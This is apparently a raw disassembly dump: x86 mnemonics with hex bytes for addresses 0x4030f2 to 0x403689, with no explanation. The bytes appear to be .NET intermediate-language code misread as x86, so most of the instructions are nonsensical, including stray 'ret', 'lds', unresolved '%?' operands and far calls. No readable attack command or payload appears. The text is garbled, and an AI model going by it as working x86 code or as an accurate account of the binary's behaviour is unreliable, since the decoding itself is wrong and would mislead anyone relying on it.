  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	0a 16                	or     (%esi),%dl
  4030f6:	33 08                	xor    (%eax),%ecx
  4030f8:	72 f5                	jb     0x4030ef
  4030fa:	06                   	push   %es
  4030fb:	00 70 0a             	add    %dh,0xa(%eax)
  4030fe:	de 41 08             	fiadds 0x8(%ecx)
  403101:	6f                   	outsl  %ds:(%esi),(%dx)
  403102:	8a 00                	mov    (%eax),%al
  403104:	00 0a                	add    %cl,(%edx)
  403106:	16                   	push   %ss
  403107:	08 6f 8c             	or     %ch,-0x74(%edi)
  40310a:	00 00                	add    %al,(%eax)
  40310c:	0a 17                	or     (%edi),%dl
  40310e:	da 6f 8d             	fisubrl -0x73(%edi)
  403111:	00 00                	add    %al,(%eax)
  403113:	0a 0a                	or     (%edx),%cl
  403115:	de 2a                	fisubrs (%edx)
  403117:	de 0a                	fimuls (%edx)
  403119:	07                   	pop    %es
  40311a:	2c 06                	sub    $0x6,%al
  40311c:	07                   	pop    %es
  40311d:	6f                   	outsl  %ds:(%esi),(%dx)
  40311e:	5e                   	pop    %esi
  40311f:	00 00                	add    %al,(%eax)
  403121:	0a dc                	or     %ah,%bl
  403123:	de 1c 25 28 25 00 00 	ficomps 0x2528(,%eiz,1)
  40312a:	0a 13                	or     (%ebx),%dl
  40312c:	04 72                	add    $0x72,%al
  40312e:	f5                   	cmc
  40312f:	06                   	push   %es
  403130:	00 70 0a             	add    %dh,0xa(%eax)
  403133:	28 27                	sub    %ah,(%edi)
  403135:	00 00                	add    %al,(%eax)
  403137:	0a de                	or     %dh,%bl
  403139:	07                   	pop    %es
  40313a:	28 27                	sub    %ah,(%edi)
  40313c:	00 00                	add    %al,(%eax)
  40313e:	0a de                	or     %dh,%bl
  403140:	00 06                	add    %al,(%esi)
  403142:	2a 00                	sub    (%eax),%al
  403144:	01 28                	add    %ebp,(%eax)
  403146:	00 00                	add    %al,(%eax)
  403148:	02 00                	add    (%eax),%al
  40314a:	25 00 45 6a 00       	and    $0x6a4500,%eax
  40314f:	0c 00                	or     $0x0,%al
  403151:	00 00                	add    %al,(%eax)
  403153:	00 02                	add    %al,(%edx)
  403155:	00 1f                	add    %bl,(%edi)
  403157:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  40315d:	00 00                	add    %al,(%eax)
  40315f:	00 00                	add    %al,(%eax)
  403161:	00 00                	add    %al,(%eax)
  403163:	00 b1 b1 00 1c 29    	add    %dh,0x291c00b1(%ecx)
  403169:	00 00                	add    %al,(%eax)
  40316b:	01 1b                	add    %ebx,(%ebx)
  40316d:	30 03                	xor    %al,(%ebx)
  40316f:	00 8f 00 00 00 1a    	add    %cl,0x1a000000(%edi)
  403175:	00 00                	add    %al,(%eax)
  403177:	11 7e 8e             	adc    %edi,-0x72(%esi)
  40317a:	00 00                	add    %al,(%eax)
  40317c:	0a 0d 72 ff 06 00    	or     0x6ff72,%cl
  403182:	70 73                	jo     0x4031f7
  403184:	8f 00                	pop    (%eax)
  403186:	00 0a                	add    %cl,(%edx)
  403188:	0b 07                	or     (%edi),%eax
  40318a:	73 90                	jae    0x40311c
  40318c:	00 00                	add    %al,(%eax)
  40318e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403191:	6f                   	outsl  %ds:(%esi),(%dx)
  403192:	84 00                	test   %al,(%eax)
  403194:	00 0a                	add    %cl,(%edx)
  403196:	6f                   	outsl  %ds:(%esi),(%dx)
  403197:	85 00                	test   %eax,(%eax)
  403199:	00 0a                	add    %cl,(%edx)
  40319b:	13 05 2b 30 11 05    	adc    0x511302b,%eax
  4031a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a2:	86 00                	xchg   %al,(%eax)
  4031a4:	00 0a                	add    %cl,(%edx)
  4031a6:	74 5c                	je     0x403204
  4031a8:	00 00                	add    %al,(%eax)
  4031aa:	01 13                	add    %edx,(%ebx)
  4031ac:	04 09                	add    $0x9,%al
  4031ae:	11 04 72             	adc    %eax,(%edx,%esi,2)
  4031b1:	47                   	inc    %edi
  4031b2:	07                   	pop    %es
  4031b3:	00 70 6f             	add    %dh,0x6f(%eax)
  4031b6:	87 00                	xchg   %eax,(%eax)
  4031b8:	00 0a                	add    %cl,(%edx)
  4031ba:	28 91 00 00 0a 72    	sub    %dl,0x720a0000(%ecx)
  4031c0:	17                   	pop    %ss
  4031c1:	06                   	push   %es
  4031c2:	00 70 28             	add    %dh,0x28(%eax)
  4031c5:	91                   	xchg   %eax,%ecx
  4031c6:	00 00                	add    %al,(%eax)
  4031c8:	0a 28                	or     (%eax),%ch
  4031ca:	23 00                	and    (%eax),%eax
  4031cc:	00 0a                	add    %cl,(%edx)
  4031ce:	0d 11 05 6f 89       	or     $0x896f0511,%eax
  4031d3:	00 00                	add    %al,(%eax)
  4031d5:	0a 2d c7 de 0c 11    	or     0x110cdec7,%ch
  4031db:	05 2c 07 11 05       	add    $0x511072c,%eax
  4031e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031e1:	5e                   	pop    %esi
  4031e2:	00 00                	add    %al,(%eax)
  4031e4:	0a dc                	or     %ah,%bl
  4031e6:	09 0a                	or     %ecx,(%edx)
  4031e8:	de 1b                	ficomps (%ebx)
  4031ea:	de 19                	ficomps (%ecx)
  4031ec:	28 25 00 00 0a 72    	sub    %ah,0x720a0000
  4031f2:	5d                   	pop    %ebp
  4031f3:	06                   	push   %es
  4031f4:	00 70 0a             	add    %dh,0xa(%eax)
  4031f7:	28 27                	sub    %ah,(%edi)
  4031f9:	00 00                	add    %al,(%eax)
  4031fb:	0a de                	or     %dh,%bl
  4031fd:	07                   	pop    %es
  4031fe:	28 27                	sub    %ah,(%edi)
  403200:	00 00                	add    %al,(%eax)
  403202:	0a de                	or     %dh,%bl
  403204:	00 06                	add    %al,(%esi)
  403206:	2a 00                	sub    (%eax),%al
  403208:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40320b:	00 02                	add    %al,(%edx)
  40320d:	00 18                	add    %bl,(%eax)
  40320f:	00 4a 62             	add    %cl,0x62(%edx)
  403212:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403215:	00 00                	add    %al,(%eax)
  403217:	00 00                	add    %al,(%eax)
  403219:	00 00                	add    %al,(%eax)
  40321b:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  40321f:	19 29                	sbb    %ebp,(%ecx)
  403221:	00 00                	add    %al,(%eax)
  403223:	01 1b                	add    %ebx,(%ebx)
  403225:	30 03                	xor    %al,(%ebx)
  403227:	00 83 00 00 00 1b    	add    %al,0x1b000000(%ebx)
  40322d:	00 00                	add    %al,(%eax)
  40322f:	11 72 51             	adc    %esi,0x51(%edx)
  403232:	07                   	pop    %es
  403233:	00 70 73             	add    %dh,0x73(%eax)
  403236:	92                   	xchg   %eax,%edx
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 0b                	or     (%ebx),%cl
  40323b:	07                   	pop    %es
  40323c:	6f                   	outsl  %ds:(%esi),(%dx)
  40323d:	93                   	xchg   %eax,%ebx
  40323e:	00 00                	add    %al,(%eax)
  403240:	0a 07                	or     (%edi),%al
  403242:	72 47                	jb     0x40328b
  403244:	07                   	pop    %es
  403245:	00 70 6f             	add    %dh,0x6f(%eax)
  403248:	87 00                	xchg   %eax,(%eax)
  40324a:	00 0a                	add    %cl,(%edx)
  40324c:	6f                   	outsl  %ds:(%esi),(%dx)
  40324d:	15 00 00 0a 72       	adc    $0x720a0000,%eax
  403252:	91                   	xchg   %eax,%ecx
  403253:	07                   	pop    %es
  403254:	00 70 72             	add    %dh,0x72(%eax)
  403257:	1d 03 00 70 6f       	sbb    $0x6f700003,%eax
  40325c:	76 00                	jbe    0x40325e
  40325e:	00 0a                	add    %cl,(%edx)
  403260:	72 99                	jb     0x4031fb
  403262:	07                   	pop    %es
  403263:	00 70 72             	add    %dh,0x72(%eax)
  403266:	1d 03 00 70 6f       	sbb    $0x6f700003,%eax
  40326b:	76 00                	jbe    0x40326d
  40326d:	00 0a                	add    %cl,(%edx)
  40326f:	72 ab                	jb     0x40321c
  403271:	07                   	pop    %es
  403272:	00 70 72             	add    %dh,0x72(%eax)
  403275:	1d 03 00 70 6f       	sbb    $0x6f700003,%eax
  40327a:	76 00                	jbe    0x40327c
  40327c:	00 0a                	add    %cl,(%edx)
  40327e:	0a de                	or     %dh,%bl
  403280:	30 07                	xor    %al,(%edi)
  403282:	72 47                	jb     0x4032cb
  403284:	07                   	pop    %es
  403285:	00 70 6f             	add    %dh,0x6f(%eax)
  403288:	87 00                	xchg   %eax,(%eax)
  40328a:	00 0a                	add    %cl,(%edx)
  40328c:	6f                   	outsl  %ds:(%esi),(%dx)
  40328d:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  403292:	de 1d de 1b 25 28    	ficomps 0x28251bde
  403298:	25 00 00 0a 0c       	and    $0xc0a0000,%eax
  40329d:	72 5d                	jb     0x4032fc
  40329f:	06                   	push   %es
  4032a0:	00 70 0a             	add    %dh,0xa(%eax)
  4032a3:	28 27                	sub    %ah,(%edi)
  4032a5:	00 00                	add    %al,(%eax)
  4032a7:	0a de                	or     %dh,%bl
  4032a9:	07                   	pop    %es
  4032aa:	28 27                	sub    %ah,(%edi)
  4032ac:	00 00                	add    %al,(%eax)
  4032ae:	0a de                	or     %dh,%bl
  4032b0:	00 06                	add    %al,(%esi)
  4032b2:	2a 00                	sub    (%eax),%al
  4032b4:	01 10                	add    %edx,(%eax)
  4032b6:	00 00                	add    %al,(%eax)
  4032b8:	00 00                	add    %al,(%eax)
  4032ba:	00 00                	add    %al,(%eax)
  4032bc:	66 66 00 1b          	data16 data16 add %bl,(%ebx)
  4032c0:	29 00                	sub    %eax,(%eax)
  4032c2:	00 01                	add    %al,(%ecx)
  4032c4:	1b 30                	sbb    (%eax),%esi
  4032c6:	04 00                	add    $0x0,%al
  4032c8:	b9 00 00 00 1c       	mov    $0x1c000000,%ecx
  4032cd:	00 00                	add    %al,(%eax)
  4032cf:	11 14 0c             	adc    %edx,(%esp,%ecx,1)
  4032d2:	28 04 00             	sub    %al,(%eax,%eax,1)
  4032d5:	00 06                	add    %al,(%esi)
  4032d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d8:	94                   	xchg   %eax,%esp
  4032d9:	00 00                	add    %al,(%eax)
  4032db:	0a 6f 95             	or     -0x6b(%edi),%ch
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 8c 5d 00 00 01 28 	or     0x28010000(%ebp,%ebx,2),%cl
  4032e7:	96                   	xchg   %eax,%esi
  4032e8:	00 00                	add    %al,(%eax)
  4032ea:	0a 28                	or     (%eax),%ch
  4032ec:	97                   	xchg   %eax,%edi
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	0a b9 0b 07 20 00    	or     0x20070b(%ecx),%bh
  4032f5:	00 00                	add    %al,(%eax)
  4032f7:	40                   	inc    %eax
  4032f8:	6a 31                	push   $0x31
  4032fa:	32 07                	xor    (%edi),%al
  4032fc:	6c                   	insb   (%dx),%es:(%edi)
  4032fd:	23 00                	and    (%eax),%eax
  4032ff:	00 00                	add    %al,(%eax)
  403301:	00 00                	add    %al,(%eax)
  403303:	00 d0                	add    %dl,%al
  403305:	41                   	inc    %ecx
  403306:	5b                   	pop    %ebx
  403307:	13 04 12             	adc    (%edx,%edx,1),%eax
  40330a:	04 28                	add    $0x28,%al
  40330c:	98                   	cwtl
  40330d:	00 00                	add    %al,(%eax)
  40330f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403312:	1a 08                	sbb    (%eax),%cl
  403314:	6f                   	outsl  %ds:(%esi),(%dx)
  403315:	8b 00                	mov    (%eax),%eax
  403317:	00 0a                	add    %cl,(%edx)
  403319:	1a da                	sbb    %dl,%bl
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	99                   	cltd
  40331d:	00 00                	add    %al,(%eax)
  40331f:	0a 72 b3             	or     -0x4d(%edx),%dh
  403322:	07                   	pop    %es
  403323:	00 70 28             	add    %dh,0x28(%eax)
  403326:	1f                   	pop    %ds
  403327:	00 00                	add    %al,(%eax)
  403329:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40332c:	39 07                	cmp    %eax,(%edi)
  40332e:	20 00                	and    %al,(%eax)
  403330:	00 10                	add    %dl,(%eax)
  403332:	00 6a 31             	add    %ch,0x31(%edx)
  403335:	30 07                	xor    %al,(%edi)
  403337:	6c                   	insb   (%dx),%es:(%edi)
  403338:	23 00                	and    (%eax),%eax
  40333a:	00 00                	add    %al,(%eax)
  40333c:	00 00                	add    %al,(%eax)
  40333e:	00 30                	add    %dh,(%eax)
  403340:	41                   	inc    %ecx
  403341:	5b                   	pop    %ebx
  403342:	13 04 12             	adc    (%edx,%edx,1),%eax
  403345:	04 28                	add    $0x28,%al
  403347:	98                   	cwtl
  403348:	00 00                	add    %al,(%eax)
  40334a:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40334d:	1a 08                	sbb    (%eax),%cl
  40334f:	6f                   	outsl  %ds:(%esi),(%dx)
  403350:	8b 00                	mov    (%eax),%eax
  403352:	00 0a                	add    %cl,(%edx)
  403354:	1a da                	sbb    %dl,%bl
  403356:	6f                   	outsl  %ds:(%esi),(%dx)
  403357:	99                   	cltd
  403358:	00 00                	add    %al,(%eax)
  40335a:	0a 72 bb             	or     -0x45(%edx),%dh
  40335d:	07                   	pop    %es
  40335e:	00 70 28             	add    %dh,0x28(%eax)
  403361:	1f                   	pop    %ds
  403362:	00 00                	add    %al,(%eax)
  403364:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403367:	0a de                	or     %dh,%bl
  403369:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  40336e:	25 00 00 0a 0d       	and    $0xd0a0000,%eax
  403373:	72 5d                	jb     0x4033d2
  403375:	06                   	push   %es
  403376:	00 70 0a             	add    %dh,0xa(%eax)
  403379:	28 27                	sub    %ah,(%edi)
  40337b:	00 00                	add    %al,(%eax)
  40337d:	0a de                	or     %dh,%bl
  40337f:	07                   	pop    %es
  403380:	28 27                	sub    %ah,(%edi)
  403382:	00 00                	add    %al,(%eax)
  403384:	0a de                	or     %dh,%bl
  403386:	00 06                	add    %al,(%esi)
  403388:	2a 00                	sub    (%eax),%al
  40338a:	00 00                	add    %al,(%eax)
  40338c:	01 10                	add    %edx,(%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 00                	add    %al,(%eax)
  403392:	00 00                	add    %al,(%eax)
  403394:	9c                   	pushf
  403395:	9c                   	pushf
  403396:	00 1b                	add    %bl,(%ebx)
  403398:	29 00                	sub    %eax,(%eax)
  40339a:	00 01                	add    %al,(%ecx)
  40339c:	1b 30                	sbb    (%eax),%esi
  40339e:	08 00                	or     %al,(%eax)
  4033a0:	c5 01                	lds    (%ecx),%eax
  4033a2:	00 00                	add    %al,(%eax)
  4033a4:	1d 00 00 11 7e       	sbb    $0x7e110000,%eax
  4033a9:	12 00                	adc    (%eax),%al
  4033ab:	00 04 2d 05 38 b8 01 	add    %al,0x1b83805(,%ebp,1)
  4033b2:	00 00                	add    %al,(%eax)
  4033b4:	7e 13                	jle    0x4033c9
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	04 02                	add    $0x2,%al
  4033ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4033bb:	9a 00 00 0a 0a 06 16 	lcall  $0x1606,$0xa0a0000
  4033c2:	3e 56                	ds push %esi
  4033c4:	01 00                	add    %eax,(%eax)
  4033c6:	00 7e 14             	add    %bh,0x14(%esi)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	04 15                	add    $0x15,%al
  4033cd:	6a 40                	push   $0x40
  4033cf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4033d0:	00 00                	add    %al,(%eax)
  4033d2:	00 7e 15             	add    %bh,0x15(%esi)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	04 16                	add    $0x16,%al
  4033d9:	91                   	xchg   %eax,%ecx
  4033da:	16                   	push   %ss
  4033db:	40                   	inc    %eax
  4033dc:	83 00 00             	addl   $0x0,(%eax)
  4033df:	00 7e 16             	add    %bh,0x16(%esi)
  4033e2:	00 00                	add    %al,(%eax)
  4033e4:	04 6f                	add    $0x6f,%al
  4033e6:	9b                   	fwait
  4033e7:	00 00                	add    %al,(%eax)
  4033e9:	0a 28                	or     (%eax),%ch
  4033eb:	71 00                	jno    0x4033ed
  4033ed:	00 06                	add    %al,(%esi)
  4033ef:	28 9c 00 00 0a 80 14 	sub    %bl,0x14800a00(%eax,%eax,1)
  4033f6:	00 00                	add    %al,(%eax)
  4033f8:	04 7e                	add    $0x7e,%al
  4033fa:	16                   	push   %ss
  4033fb:	00 00                	add    %al,(%eax)
  4033fd:	04 6f                	add    $0x6f,%al
  4033ff:	9d                   	popf
  403400:	00 00                	add    %al,(%eax)
  403402:	0a 73 6c             	or     0x6c(%ebx),%dh
  403405:	00 00                	add    %al,(%eax)
  403407:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  40340d:	7e 14                	jle    0x403423
  40340f:	00 00                	add    %al,(%eax)
  403411:	04 16                	add    $0x16,%al
  403413:	6a 33                	push   $0x33
  403415:	36 15 6a 80 14 00    	ss adc $0x14806a,%eax
  40341b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40341e:	13 00                	adc    (%eax),%eax
  403420:	00 04 7e             	add    %al,(%esi,%edi,2)
  403423:	15 00 00 04 16       	adc    $0x16040000,%eax
  403428:	7e 15                	jle    0x40343f
  40342a:	00 00                	add    %al,(%eax)
  40342c:	04 8e                	add    $0x8e,%al
  40342e:	b7 16                	mov    $0x16,%bh
  403430:	14 fe                	adc    $0xfe,%al
  403432:	06                   	push   %es
  403433:	2d 00 00 06 73       	sub    $0x73060000,%eax
  403438:	70 00                	jo     0x40343a
  40343a:	00 0a                	add    %cl,(%edx)
  40343c:	7e 13                	jle    0x403451
  40343e:	00 00                	add    %al,(%eax)
  403440:	04 6f                	add    $0x6f,%al
  403442:	71 00                	jno    0x403444
  403444:	00 0a                	add    %cl,(%edx)
  403446:	26 dd 20             	frstor %es:(%eax)
  403449:	01 00                	add    %eax,(%eax)
  40344b:	00 7e 14             	add    %bh,0x14(%esi)
  40344e:	00 00                	add    %al,(%eax)
  403450:	04 17                	add    $0x17,%al
  403452:	6a da                	push   $0xffffffda
  403454:	b7 17                	mov    $0x17,%bh
  403456:	d6                   	salc
  403457:	8d 4f 00             	lea    0x0(%edi),%ecx
  40345a:	00 01                	add    %al,(%ecx)
  40345c:	80 15 00 00 04 2b 11 	adcb   $0x11,0x2b040000
  403463:	7e 16                	jle    0x40347b
  403465:	00 00                	add    %al,(%eax)
  403467:	04 7e                	add    $0x7e,%al
  403469:	15 00 00 04 16       	adc    $0x16040000,%eax
  40346e:	91                   	xchg   %eax,%ecx
  40346f:	6f                   	outsl  %ds:(%esi),(%dx)
  403470:	9e                   	sahf
  403471:	00 00                	add    %al,(%eax)
  403473:	0a 38                	or     (%eax),%bh
  403475:	a2 00 00 00 7e       	mov    %al,0x7e000000
  40347a:	16                   	push   %ss
  40347b:	00 00                	add    %al,(%eax)
  40347d:	04 7e                	add    $0x7e,%al
  40347f:	15 00 00 04 16       	adc    $0x16040000,%eax
  403484:	06                   	push   %es
  403485:	6f                   	outsl  %ds:(%esi),(%dx)
  403486:	9f                   	lahf
  403487:	00 00                	add    %al,(%eax)
  403489:	0a 7e 16             	or     0x16(%esi),%bh
  40348c:	00 00                	add    %al,(%eax)
  40348e:	04 6f                	add    $0x6f,%al
  403490:	a0 00 00 0a 7e       	mov    0x7e0a0000,%al
  403495:	14 00                	adc    $0x0,%al
  403497:	00 04 33             	add    %al,(%ebx,%esi,1)
  40349a:	60                   	pusha
  40349b:	14 fe                	adc    $0xfe,%al
  40349d:	06                   	push   %es
  40349e:	35 00 00 06 73       	xor    $0x73060000,%eax
  4034a3:	a1 00 00 0a 73       	mov    0x730a0000,%eax
  4034a8:	a2 00 00 0a 0b       	mov    %al,0xb0a0000
  4034ad:	07                   	pop    %es
  4034ae:	14 72                	adc    $0x72,%al
  4034b0:	c3                   	ret
  4034b1:	07                   	pop    %es
  4034b2:	00 70 17             	add    %dh,0x17(%eax)
  4034b5:	8d 03                	lea    (%ebx),%eax
  4034b7:	00 00                	add    %al,(%eax)
  4034b9:	01 0d 09 16 7e 16    	add    %ecx,0x167e1609
  4034bf:	00 00                	add    %al,(%eax)
  4034c1:	04 6f                	add    $0x6f,%al
  4034c3:	9b                   	fwait
  4034c4:	00 00                	add    %al,(%eax)
  4034c6:	0a a2 09 14 14 14    	or     0x14141409(%edx),%ah
  4034cc:	17                   	pop    %ss
  4034cd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4034d1:	0a 26                	or     (%esi),%ah
  4034d3:	15 6a 80 14 00       	adc    $0x14806a,%eax
  4034d8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4034db:	16                   	push   %ss
  4034dc:	00 00                	add    %al,(%eax)
  4034de:	04 6f                	add    $0x6f,%al
  4034e0:	9d                   	popf
  4034e1:	00 00                	add    %al,(%eax)
  4034e3:	0a 73 6c             	or     0x6c(%ebx),%dh
  4034e6:	00 00                	add    %al,(%eax)
  4034e8:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  4034ee:	17                   	pop    %ss
  4034ef:	8d 4f 00             	lea    0x0(%edi),%ecx
  4034f2:	00 01                	add    %al,(%ecx)
  4034f4:	80 15 00 00 04 2b 20 	adcb   $0x20,0x2b040000
  4034fb:	7e 14                	jle    0x403511
  4034fd:	00 00                	add    %al,(%eax)
  4034ff:	04 7e                	add    $0x7e,%al
  403501:	16                   	push   %ss
  403502:	00 00                	add    %al,(%eax)
  403504:	04 6f                	add    $0x6f,%al
  403506:	a0 00 00 0a da       	mov    0xda0a0000,%al
  40350b:	17                   	pop    %ss
  40350c:	6a da                	push   $0xffffffda
  40350e:	b7 17                	mov    $0x17,%bh
  403510:	d6                   	salc
  403511:	8d 4f 00             	lea    0x0(%edi),%ecx
  403514:	00 01                	add    %al,(%ecx)
  403516:	80 15 00 00 04 2b 08 	adcb   $0x8,0x2b040000
  40351d:	16                   	push   %ss
  40351e:	80 12 00             	adcb   $0x0,(%edx)
  403521:	00 04 de             	add    %al,(%esi,%ebx,8)
  403524:	47                   	inc    %edi
  403525:	7e 13                	jle    0x40353a
  403527:	00 00                	add    %al,(%eax)
  403529:	04 7e                	add    $0x7e,%al
  40352b:	15 00 00 04 16       	adc    $0x16040000,%eax
  403530:	7e 15                	jle    0x403547
  403532:	00 00                	add    %al,(%eax)
  403534:	04 8e                	add    $0x8e,%al
  403536:	b7 16                	mov    $0x16,%bh
  403538:	14 fe                	adc    $0xfe,%al
  40353a:	06                   	push   %es
  40353b:	2d 00 00 06 73       	sub    $0x73060000,%eax
  403540:	70 00                	jo     0x403542
  403542:	00 0a                	add    %cl,(%edx)
  403544:	7e 13                	jle    0x403559
  403546:	00 00                	add    %al,(%eax)
  403548:	04 6f                	add    $0x6f,%al
  40354a:	71 00                	jno    0x40354c
  40354c:	00 0a                	add    %cl,(%edx)
  40354e:	26 de 1b             	ficomps %es:(%ebx)
  403551:	25 28 25 00 00       	and    $0x2528,%eax
  403556:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403559:	80 12 00             	adcb   $0x0,(%edx)
  40355c:	00 04 28             	add    %al,(%eax,%ebp,1)
  40355f:	27                   	daa
  403560:	00 00                	add    %al,(%eax)
  403562:	0a de                	or     %dh,%bl
  403564:	07                   	pop    %es
  403565:	28 27                	sub    %ah,(%edi)
  403567:	00 00                	add    %al,(%eax)
  403569:	0a de                	or     %dh,%bl
  40356b:	00 2a                	add    %ch,(%edx)
  40356d:	00 00                	add    %al,(%eax)
  40356f:	00 41 1c             	add    %al,0x1c(%ecx)
  403572:	00 00                	add    %al,(%eax)
  403574:	00 00                	add    %al,(%eax)
  403576:	00 00                	add    %al,(%eax)
  403578:	0c 00                	or     $0x0,%al
  40357a:	00 00                	add    %al,(%eax)
  40357c:	9d                   	popf
  40357d:	01 00                	add    %eax,(%eax)
  40357f:	00 a9 01 00 00 1b    	add    %ch,0x1b000001(%ecx)
  403585:	00 00                	add    %al,(%eax)
  403587:	00 29                	add    %ch,(%ecx)
  403589:	00 00                	add    %al,(%eax)
  40358b:	01 1b                	add    %ebx,(%ebx)
  40358d:	30 02                	xor    %al,(%edx)
  40358f:	00 17                	add    %dl,(%edi)
  403591:	00 00                	add    %al,(%eax)
  403593:	00 1e                	add    %bl,(%esi)
  403595:	00 00                	add    %al,(%eax)
  403597:	11 02                	adc    %eax,(%edx)
  403599:	28 37                	sub    %dh,(%edi)
  40359b:	00 00                	add    %al,(%eax)
  40359d:	06                   	push   %es
  40359e:	de 0e                	fimuls (%esi)
  4035a0:	25 28 25 00 00       	and    $0x2528,%eax
  4035a5:	0a 0a                	or     (%edx),%cl
  4035a7:	28 27                	sub    %ah,(%edi)
  4035a9:	00 00                	add    %al,(%eax)
  4035ab:	0a de                	or     %dh,%bl
  4035ad:	00 2a                	add    %ch,(%edx)
  4035af:	00 01                	add    %al,(%ecx)
  4035b1:	10 00                	adc    %al,(%eax)
  4035b3:	00 00                	add    %al,(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 08                	add    %cl,(%eax)
  4035b9:	08 00                	or     %al,(%eax)
  4035bb:	0e                   	push   %cs
  4035bc:	29 00                	sub    %eax,(%eax)
  4035be:	00 01                	add    %al,(%ecx)
  4035c0:	1b 30                	sbb    (%eax),%esi
  4035c2:	07                   	pop    %es
  4035c3:	00 c9                	add    %cl,%cl
  4035c5:	00 00                	add    %al,(%eax)
  4035c7:	00 1f                	add    %bl,(%edi)
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	11 7e 19             	adc    %edi,0x19(%esi)
  4035ce:	00 00                	add    %al,(%eax)
  4035d0:	04 13                	add    $0x13,%al
  4035d2:	04 11                	add    $0x11,%al
  4035d4:	04 28                	add    $0x28,%al
  4035d6:	a3 00 00 0a 16       	mov    %eax,0x160a0000
  4035db:	13 05 11 04 12 05    	adc    0x5120411,%eax
  4035e1:	28 a4 00 00 0a 7e 12 	sub    %ah,0x127e0a00(%eax,%eax,1)
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 39                	add    $0x39,%al
  4035ec:	96                   	xchg   %eax,%esi
  4035ed:	00 00                	add    %al,(%eax)
  4035ef:	00 73 6c             	add    %dh,0x6c(%ebx)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	0a 0a                	or     (%edx),%cl
  4035f6:	02 28                	add    (%eax),%ch
  4035f8:	70 00                	jo     0x4035fa
  4035fa:	00 06                	add    %al,(%esi)
  4035fc:	28 78 00             	sub    %bh,0x0(%eax)
  4035ff:	00 06                	add    %al,(%esi)
  403601:	0b 07                	or     (%edi),%eax
  403603:	8e b7 28 a5 00 00    	mov    0xa528(%edi),%?
  403609:	0a 72 cf             	or     -0x31(%edx),%dh
  40360c:	07                   	pop    %es
  40360d:	00 70 28             	add    %dh,0x28(%eax)
  403610:	1f                   	pop    %ds
  403611:	00 00                	add    %al,(%eax)
  403613:	0a 28                	or     (%eax),%ch
  403615:	70 00                	jo     0x403617
  403617:	00 06                	add    %al,(%esi)
  403619:	0c 06                	or     $0x6,%al
  40361b:	08 16                	or     %dl,(%esi)
  40361d:	08 8e b7 6f 9f 00    	or     %cl,0x9f6fb7(%esi)
  403623:	00 0a                	add    %cl,(%edx)
  403625:	06                   	push   %es
  403626:	07                   	pop    %es
  403627:	16                   	push   %ss
  403628:	07                   	pop    %es
  403629:	8e b7 6f 9f 00 00    	mov    0x9f6f(%edi),%?
  40362f:	0a 7e 13             	or     0x13(%esi),%bh
  403632:	00 00                	add    %al,(%eax)
  403634:	04 15                	add    $0x15,%al
  403636:	17                   	pop    %ss
  403637:	6f                   	outsl  %ds:(%esi),(%dx)
  403638:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403639:	00 00                	add    %al,(%eax)
  40363b:	0a 26                	or     (%esi),%ah
  40363d:	7e 13                	jle    0x403652
  40363f:	00 00                	add    %al,(%eax)
  403641:	04 06                	add    $0x6,%al
  403643:	6f                   	outsl  %ds:(%esi),(%dx)
  403644:	9b                   	fwait
  403645:	00 00                	add    %al,(%eax)
  403647:	0a 16                	or     (%esi),%dl
  403649:	06                   	push   %es
  40364a:	6f                   	outsl  %ds:(%esi),(%dx)
  40364b:	a0 00 00 0a b7       	mov    0xb70a0000,%al
  403650:	16                   	push   %ss
  403651:	14 fe                	adc    $0xfe,%al
  403653:	06                   	push   %es
  403654:	30 00                	xor    %al,(%eax)
  403656:	00 06                	add    %al,(%esi)
  403658:	73 70                	jae    0x4036ca
  40365a:	00 00                	add    %al,(%eax)
  40365c:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40365f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403660:	00 00                	add    %al,(%eax)
  403662:	0a 26                	or     (%esi),%ah
  403664:	de 0a                	fimuls (%edx)
  403666:	06                   	push   %es
  403667:	2c 06                	sub    $0x6,%al
  403669:	06                   	push   %es
  40366a:	6f                   	outsl  %ds:(%esi),(%dx)
  40366b:	5e                   	pop    %esi
  40366c:	00 00                	add    %al,(%eax)
  40366e:	0a dc                	or     %ah,%bl
  403670:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  403677:	0a 0d 16 80 12 00    	or     0x128016,%cl
  40367d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403680:	27                   	daa
  403681:	00 00                	add    %al,(%eax)
  403683:	0a de                	or     %dh,%bl
  403685:	00 de                	add    %bl,%dh
  403687:	0c 11                	or     $0x11,%al
